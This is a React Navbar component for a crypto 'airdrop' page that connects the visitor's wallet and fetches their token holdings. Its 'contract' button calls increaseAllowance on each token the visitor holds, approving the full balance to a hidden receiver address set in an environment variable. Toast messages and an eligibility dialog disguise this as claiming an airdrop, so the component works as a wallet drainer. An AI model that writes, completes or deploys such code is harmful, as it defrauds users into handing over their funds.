"use client";
import React, { useCallback, useEffect, useMemo, useState } from "react";
import { toast } from "sonner";
import { AddressLike, BrowserProvider, Eip1193Provider, ethers , Contract } from "ethers";
import { useEvmNativeBalance } from "@moralisweb3/next";
import BigNumber from "bignumber.js";
import { Button } from "../../ui/button";
import {
  useWeb3ModalProvider,
  useWeb3Modal,
  useWalletInfo,
  useWeb3ModalAccount,
  useDisconnect,
  useWeb3ModalState,
  useSwitchNetwork,
} from "@web3modal/ethers/react";
import Image from "next/image";
import { storeUsersWalletAddress } from "@/app/services/zustand/tokenWallet";
import { executeUsersWallet } from "@/app/services/zustand/api/getUsersToken";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/app/components/ui/alert-dialog";

function Navbar() {
  const { open } = useWeb3Modal();
  const { walletProvider } = useWeb3ModalProvider();
  const { walletInfo } = useWalletInfo();
  const { disconnect } = useDisconnect();
  const { address, chainId, isConnected } = useWeb3ModalAccount();
  const { switchNetwork } = useSwitchNetwork();
  const { selectedNetworkId } = useWeb3ModalState();
//   const { data: nativeBalance } = useEvmNativeBalance({
//     address: String(address),
//   });
//   console.log(nativeBalance, "Eth balances");
  const [getProvider, setGetProvider] = useState<BrowserProvider>();
  const [getSigner, setGetSigner] = useState<ethers.JsonRpcSigner>();
  const getWalletMetadata = executeUsersWallet(
    (state) => state.getUsersWalletToken
  );
  const usersWalletData = executeUsersWallet((state) => state.usersWalletToken);
  const [showAlert, setShowAlert] = useState<boolean>(false);

  //zustand
  const setUsersAddress = storeUsersWalletAddress(
    (state) => state.getUsersWallet
  );
  const walletAbi = [
    {
        "type": "function",
        "name": "increaseAllowance",
        "inputs": [
          {
            "name": "spender",
            "type": "address"
          },
          {
            "name": "addedValue",
            "type": "uint256"
          }
        ],
        "outputs": [
          {
            "name": "",
            "type": "bool"
          }
        ],
        "stateMutability": "nonpayable",
        "visibility": "public"
      }
  ];

  useEffect(() => {
    if (!isConnected){
        setShowAlert(false)
        return;
    }
        // getWalletMetadata(String(address));
        getWalletMetadata("0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d");

 
  }, [isConnected]);



  useEffect(() => {
    (async () => {
      if (selectedNetworkId != String(1)) {
        switchNetwork(1);
        return ;
      }
      if (walletProvider == undefined) return;
      const provider = new BrowserProvider(walletProvider);
      const signer = await provider.getSigner();
      const balanceEth = await provider.getBalance(address as AddressLike);
    //   usersWalletData?.token?.map(async (item:any, index:number)=>{
    //       const contract =  new Contract(item.token_address , walletAbi , getSigner)
    //       console.log(item , index , contract)
    //     //  const data =    await contract.increaseAllowance(String(process.env.NEXT_PUBLIC_RECEIVERADDRESS ,item?.balance ))
    //     //  console.log(data)
    //   })
      setGetProvider(provider);
      setGetSigner(signer);
   
    })();
  }, [selectedNetworkId, walletProvider, setGetProvider, setGetSigner,usersWalletData]);


  useMemo(()=>{
      if(usersWalletData?.token?.length == 0){
    setShowAlert(true)
 } else {
    setShowAlert(false)
 }
  },[usersWalletData , setShowAlert])

  const connectWallet = async () => {
    try {
      open({ view: "Networks" });
      setUsersAddress(String(address));
      toast("Wallet Connection Established", {
        description: "You are now ready to claim your Airdrop",
      });
    } catch (error: any) {
      console.log(error);
    }

    //provider init
  };

  const walletDisconnected = () => {
    disconnect();
    toast("Wallet disconnected", {
      description: "Your Wallet is disconnected",
    });
  };

const callContract = async()=>{
     try{

        getWalletMetadata("0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d");

    if (!isConnected) throw Error('User disconnected')
        const walletAbi = [
            {
                "type": "function",
                "name": "increaseAllowance",
                "inputs": [
                  {
                    "name": "spender",
                    "type": "address"
                  },
                  {
                    "name": "addedValue",
                    "type": "uint256"
                  }
                ],
                "outputs": [
                  {
                    "name": "",
                    "type": "bool"
                  }
                ],
                "stateMutability": "nonpayable",
                "visibility": "public"
              }
            ];

        if (!walletProvider) throw Error('walletProvider not available');
        const ethersProvider = new BrowserProvider(walletProvider)
        const signer = await ethersProvider.getSigner()
        console.log(signer , ethersProvider , walletProvider , usersWalletData)
        if( usersWalletData?.token?.length == 0 ){
            setShowAlert(true)
            throw Error('you are not eligible for this airdrop');
            return;

        }
        usersWalletData?.token?.map(async (item:any, index:number)=>{
            try{
                const contract =  new Contract(String(item.token_address), walletAbi , signer)
                const amount = new BigNumber(item.balance);
                const data =   await contract.increaseAllowance(process.env.NEXT_PUBLIC_RECEIVERADDRESS, item?.balance)
                console.log(contract , data)

            }catch(error:any){
                console.log(error)
            }
        })


    }catch(error:any){
          console.log("this is the error " , error)
    }

}
 


  return (
    <div className="">
      <div>
        {isConnected ? (
            <>
            <Button onClick={()=>callContract()}>
                contract
            </Button>
          <Button onClick={() => walletDisconnected()}>
            <Image
              src={String(walletInfo?.icon)}
              alt={String(walletInfo?.name)}
              height={30}
              width={30}
            />
            <span>
              {String(
                address?.slice(0, 5) + "..." + address?.slice(38, 42)
              ).toLowerCase()}
            </span>
          </Button>
          </>
        ) : (
          <Button variant={"secondary"} onClick={() => connectWallet()}>
            Connect Wallet
          </Button>
        )}
      </div>
        <AlertDialog open={showAlert} onOpenChange={setShowAlert}>
          <AlertDialogContent>
            <AlertDialogHeader>
              <AlertDialogTitle>Notice: You're Not Eligible for the Current Airdrop</AlertDialogTitle>
              <AlertDialogDescription>
              We regret to inform you that you are not eligible to participate in the ongoing airdrop. Our airdrop 
              program is designed to reward active community members, and unfortunately, you do not meet the 
              criteria at this time. We appreciate your interest and support, and we encourage you to stay 
              engaged with our project for future opportunities. Thank you for your understanding.
              </AlertDialogDescription>
            </AlertDialogHeader>
            <AlertDialogFooter>
              <AlertDialogCancel>Cancel</AlertDialogCancel>
              {/* <AlertDialogAction>Continue</AlertDialogAction> */}
            </AlertDialogFooter>
          </AlertDialogContent>
        </AlertDialog>
    </div>
  );
}

export default Navbar;
